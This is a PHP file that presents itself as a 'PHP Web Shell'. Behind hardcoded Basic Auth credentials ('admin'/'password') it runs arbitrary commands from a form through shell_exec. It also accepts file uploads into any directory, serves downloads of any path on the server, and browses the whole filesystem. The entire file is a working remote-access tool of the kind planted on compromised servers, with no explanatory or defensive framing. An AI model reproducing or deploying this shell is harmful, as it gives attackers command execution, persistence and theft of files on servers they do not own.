<?php
// Basic Authentication
$auth_user = 'admin';
$auth_pass = 'password';

$realm = 'Restricted area';
if (!isset($_SERVER['PHP_AUTH_USER'])) {
    header('WWW-Authenticate: Basic realm="' . $realm . '"');
    header('HTTP/1.0 401 Unauthorized');
    echo 'Authorization required';
    exit;
} else {
    if ($_SERVER['PHP_AUTH_USER'] !== $auth_user || $_SERVER['PHP_AUTH_PW'] !== $auth_pass) {
        header('HTTP/1.0 401 Unauthorized');
        echo 'Unauthorized';
        exit;
    }
}

// Get current directory
$dir = isset($_GET['dir']) ? $_GET['dir'] : '.';

// Normalize directory path
$dir = realpath($dir);

// Ensure directory exists
if (!is_dir($dir)) {
    die("Invalid directory: $dir");
}

// File download handler
if (isset($_GET['download'])) {
    $file = realpath($_GET['download']);
    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    } else {
        echo "File does not exist.";
    }
}

// File upload handler
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file_to_upload'])) {
    $target_file = $dir . '/' . basename($_FILES['file_to_upload']['name']);
    if (move_uploaded_file($_FILES['file_to_upload']['tmp_name'], $target_file)) {
        echo "File has been uploaded successfully.";
    } else {
        echo "Sorry, there was an error uploading your file.";
    }
}

// Command execution handler
$command_output = '';
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $command_output = "<pre>" . htmlspecialchars(shell_exec($cmd)) . "</pre>";
}

// Directory listing
function list_files($dir) {
    $files = scandir($dir);
    foreach ($files as $file) {
        if ($file == '.' || $file == '..') {
            continue;
        }
        $fullpath = realpath("$dir/$file");
        if (is_dir($fullpath)) {
            echo '<a href="?dir=' . urlencode($fullpath) . '">' . htmlspecialchars($file) . '/</a><br>';
        } else {
            echo '<a href="?dir=' . urlencode($dir) . '&download=' . urlencode($fullpath) . '">' . 
htmlspecialchars($file) . '</a><br>';
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>PHP Web Shell</title>
</head>
<body>

<h2>Current Directory: <?php echo htmlspecialchars($dir); ?></h2>

<!-- Navigation to the parent directory -->
<p><a href="?dir=<?php echo urlencode(dirname($dir)); ?>">Go Up</a></p>

<!-- Command Execution Form -->
<h2>Execute Command</h2>
<form method="post">
    <input type="text" name="cmd" placeholder="Enter command">
    <input type="submit" value="Execute">
</form>

<?php echo $command_output; ?>

<!-- File Upload Form -->
<h2>Upload File</h2>
<form action="" method="post" enctype="multipart/form-data">
    <input type="file" name="file_to_upload">
    <input type="submit" value="Upload">
</form>

<!-- Directory Listing -->
<h2>Directory Contents</h2>
<?php list_files($dir); ?>

</body>
</html>
